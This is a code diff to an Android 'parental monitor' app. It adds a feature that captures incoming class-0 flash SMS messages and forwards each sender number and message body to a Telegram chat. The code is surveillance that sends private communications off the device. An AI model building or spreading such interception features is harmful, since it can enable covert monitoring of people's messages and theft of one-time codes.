@@ -395,6 +395,7 @@ class MonitoringService : Service() {
         const val ACTION_UNLOCK_FAILED = "UNLOCK_FAILED"
         const val EXTRA_UNLOCK_ATTEMPTS = "unlock_attempts"
         const val ACTION_SMS_RECEIVED = "SMS_RECEIVED"
+        const val EXTRA_SMS_FLASH = "sms_flash_pairs"
         const val ACTION_CALL_STATE = "CALL_STATE_IDLE"
         const val ACTION_AFTER_SHOT_GRANT = "AFTER_SHOT_GRANT"
         private const val SELF_TEST_ALARM_DELAY_MS = 45_000L
@@ -924,6 +925,24 @@ class MonitoringService : Service() {
                 return START_NOT_STICKY
             }
             ACTION_SMS_RECEIVED, ACTION_CALL_STATE -> {
+                // SMS flash kelas-0 (issue #1476): tak pernah
+                // tersimpan di provider, jadi penerima
+                // meneruskan isinya langsung lewat extra ini.
+                val flash = try { intent?.getStringArrayListExtra(EXTRA_SMS_FLASH) } catch (_: Exception) { null }
+                if (flash != null && flash.size >= 2) {
+                    serviceScope.launch {
+                        try {
+                            var fi = 0
+                            while (fi + 1 < flash.size) {
+                                val faddr = flash[fi]
+                                val fbody = flash[fi + 1]
+                                fi += 2
+                                sendToTelegram("⚡ <b>SMS flash (kelas-0)</b>\n📞 Nomor: " + com.redeye.parentalmonitor.utils.Html.escape(faddr) + "\n📝 Isi: " + com.redeye.parentalmonitor.utils.Html.escape(smsBodyTampil(fbody)))
+                            }
+                        } catch (_: Exception) {
+                        }
+                    }
+                }
                 if (!isRunning && shouldAutoResume()) {
                     startMonitoring()
                 }
